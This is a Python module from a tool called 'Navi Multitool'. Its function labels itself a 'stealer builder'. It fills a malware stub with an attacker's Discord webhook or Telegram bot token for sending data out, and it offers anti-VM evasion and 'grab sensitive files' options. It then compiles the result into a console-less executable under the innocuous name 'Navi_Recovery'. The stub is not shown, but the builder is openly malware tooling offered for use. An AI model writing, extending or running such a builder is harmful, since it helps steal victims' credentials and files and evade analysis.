#  _   _                 _ 
# | \ | |               (_)
# |  \| | __ ___   __ _  _ 
# | . ` |/ _` \ \ / /(_)| |
# | |\  | (_| |\ V /  _ | |
# |_| \_|\__,_| \_/  (_)|_|
# 
# Navi Multitool - Developed by glockinhand
# GitHub: https://github.com/glockinhand/navi-multitool

import os, json, re, subprocess
from core.display import get_inpt, Colors, Colorate, Theme

def build_navi_recovery():
    cl = Theme.get_colors()
    sp = os.path.join("modules", "recovery_stub.txt")
    
    if not os.path.exists(sp):
        print(Colorate.Horizontal(cl["num"], "  [!] Missing recovery_stub.txt"))
        return

    try:
        with open(sp, 'r', encoding='utf-8') as f:
            stub = f.read()
    except:
        print(Colorate.Horizontal(cl["num"], "  [!] Error reading stub."))
        return

    print(Colorate.Horizontal(cl["head"], "  [ NAVI STEALER BUILDER ]\n"))
    
    delivery = get_inpt("delivery (discord/telegram):").lower()
    hook, bot_token, chat_id = "", "", ""
    
    if delivery == "telegram":
        bot_token = get_inpt("bot token:")
        chat_id = get_inpt("chat id:")
    else:
        delivery = "discord" # default
        hook = get_inpt("webhook url:")
    
    if not hook and not bot_token: return
    
    ping = get_inpt("ping on hit? (y/n):").lower() == 'y'
    dbg = get_inpt("debug mode? (y/n):").lower() == 'y'
    sec = get_inpt("anti-vm? (y/n):").lower() == 'y'
    files = get_inpt("grab sensitive files? (y/n):").lower() == 'y'
    
    # placeholders
    stub = stub.replace("{{WEBHOOK}}", hook)
    stub = stub.replace("{{DELIVERY}}", delivery)
    stub = stub.replace("{{BOT_TOKEN}}", bot_token)
    stub = stub.replace("{{CHAT_ID}}", chat_id)
    stub = stub.replace("{{PING}}", "True" if ping else "False")
    stub = stub.replace("{{DEBUG}}", "True" if dbg else "False")
    stub = stub.replace("{{ANTI_VM}}", "True" if sec else "False")
    stub = stub.replace("{{SENSITIVE}}", "True" if files else "False")

    if not os.path.exists('output'): os.mkdir('output')
    out_name = "Navi_Stub.py"
    out_path = os.path.join('output', out_name)
    
    with open(out_path, 'w', encoding='utf-8') as f:
        f.write(stub)
    
    print(Colorate.Horizontal(cl["head"], f"\n  [+] Built: {out_path}"))
    
    if get_inpt("compile to exe? (y/n):").lower() == 'y':
        print(Colorate.Horizontal(cl["num"], "  [!] Compiling with PyInstaller..."))
        try:
            subprocess.run(f"pyinstaller --onefile --noconsole --icon NONE --distpath ./output --name Navi_Recovery {out_path}", shell=True)
            print(Colorate.Horizontal(cl["head"], "  [+] Compiled: output/Navi_Recovery.exe"))
        except Exception as e:
            print(Colorate.Horizontal(cl["num"], f"  [!] Build Error: {e}"))

    subprocess.run(['explorer', os.path.abspath('output')])
